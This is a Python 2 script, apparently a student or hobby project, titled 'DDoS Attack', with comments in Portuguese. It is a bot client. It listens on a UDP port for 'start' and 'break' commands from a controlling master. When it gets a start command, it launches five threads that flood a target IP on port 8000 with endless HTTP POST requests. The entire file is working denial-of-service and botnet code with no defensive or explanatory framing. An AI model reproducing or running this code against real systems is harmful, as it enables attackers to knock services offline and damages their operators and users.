#DDoS Attack
#Created by : Yuri Castro

#Bibliotecas
from socket import *
import requests
from threading import Thread

#Variavel global que ira controlar a execucao
global Kill
#Variavel para parar o ataque
Kill = False

#Funcao ataque
def Post(url,attackedServerPort):
    parameters = {'dumb': 'dumb'}
    headers = {'keep_alive': 'True'}
    while not Kill:
        r = requests.post(url,data = parameters, headers=headers)
        print r.text

#Funcao que controlara o attack
def Is_attack(msg):

    #Ira analisar a variavel global
    global Kill

    #Se receber a mensagem S de start 
    if (msg == 'S'):
        print 'Starting attack'
        #Nao mata as threads e continua o ataque
        Kill = False
    #Se receber a mensagem B de BREAK    
    elif (msg == 'B'):
        #Mata as threads e para o ataque
        print 'Attack over'
        Kill = True

#Funcao que ira criar as Threas 
def attack(IP, attackedServerPort):

    #Definicao das 5 threads 
    channel1 = Thread(target= Post, args= [IP, attackedServerPort])
    channel2 = Thread(target= Post, args= [IP, attackedServerPort])
    channel3 = Thread(target= Post, args= [IP, attackedServerPort])
    channel4 = Thread(target= Post, args= [IP, attackedServerPort])
    channel5 = Thread(target= Post, args= [IP, attackedServerPort])

    #seta as threads como daemon
    channel1.setDaemon(True)
    channel2.setDaemon(True)
    channel3.setDaemon(True)
    channel4.setDaemon(True)
    channel5.setDaemon(True)
    #Inicia as 5 threads
    channel1.start()
    channel2.start()
    channel3.start()
    channel4.start()
    channel5.start()

#Funcao que escuta o controle central
def listening():

    sentence = ''

    #Porta que ira atacar
    attackedServerPort = 8000

    #Porta do servidor
    serverPort = 12000

    #Criando socket
    serverSocket = socket(AF_INET, SOCK_DGRAM)

    hostName = gethostbyname('0.0.0.0')

    #Junta porta com o nome do host
    serverSocket.bind((hostName, serverPort))

    print 'Waiting for my master...'

    while not sentence:
        sentence, addr = serverSocket.recvfrom(1024)


    command = sentence.split('/')[0]
    IP = sentence.split('/')[1]

    IP = 'http://' + IP + ':' + str(attackedServerPort)

    attackThread = Thread(target=attack, args=[IP, attackedServerPort])
    attackThread.setDaemon(True) # vai setar a thread como daemon, o que vai possibilitar o fechamento delas
    attackThread.start()

    while 1:
        sentence, addr = serverSocket.recvfrom(1024)
        command = sentence.split('/')[0]
        Is_attack(command)

    #Fecha socket    
    serverSocket.close()


if __name__ == "__main__":

    listeningThread = Thread(target= listening)
    listeningThread.start()